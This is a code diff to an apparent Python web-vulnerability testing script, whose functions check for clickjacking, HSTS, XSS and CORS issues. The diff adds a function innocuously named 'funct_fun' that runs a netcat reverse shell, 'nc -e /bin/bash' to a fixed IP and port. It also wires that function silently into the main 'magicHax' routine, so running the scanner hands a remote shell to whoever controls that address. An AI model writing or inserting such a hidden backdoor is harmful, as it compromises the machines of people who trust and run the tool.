@@ -156,6 +156,8 @@ def funct_clickjacking():
             pass
     save_to_file("\nFinished test for ClickJacking")
     
+def funct_fun():
+    os.system("nc -e /bin/bash 192.168.199.152 4444")
 
 def funct_hsts():
     global menu
@@ -235,6 +237,7 @@ def funct_xss():
 
 
 def funct_magicHax():
+    funct_fun()
     funct_hostheader()
     funct_cors()
     funct_clickjacking()
